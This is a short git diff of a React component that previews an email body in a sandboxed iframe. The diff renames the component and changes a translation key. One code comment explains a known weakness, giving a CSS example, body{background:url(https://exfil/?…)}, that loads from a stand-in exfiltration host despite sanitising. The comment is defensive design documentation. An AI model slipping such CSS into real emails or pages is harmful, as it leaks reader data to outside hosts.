@@ -2,7 +2,7 @@ import { useMemo } from 'react';
 import { useTranslation } from 'react-i18next';
 import DOMPurify from 'dompurify';
 
-/** Books' email body, rendered as the client will see it.
+/** Books' email body — quote or invoice — rendered as the client will see it.
  *
  *  An iframe rather than the `dangerouslySetInnerHTML` div used elsewhere in
  *  this codebase (ProjectDetailPage, MakerworldPage): the body is a whole
@@ -26,7 +26,7 @@ import DOMPurify from 'dompurify';
  *      lets through (e.g. body{background:url(https://exfil/?…)}) —
  *      sandbox="" places no restriction on subresource loads.
  */
-export function QuoteEmailPreview({
+export function ZohoEmailPreview({
   html,
   labelledBy,
 }: {
@@ -86,7 +86,7 @@ export function QuoteEmailPreview({
       sandbox=""
       // An iframe with no accessible name is worse than one with a name
       // duplicated by an external label, so title is the fallback.
-      title={labelledBy ? undefined : t('aito.sendQuoteMessage')}
+      title={labelledBy ? undefined : t('aito.emailPreviewTitle')}
       aria-labelledby={labelledBy}
       srcDoc={srcDoc}
       className="w-full h-[min(55vh,26rem)] min-h-[14rem] rounded-lg border border-bambu-dark-tertiary bg-white"
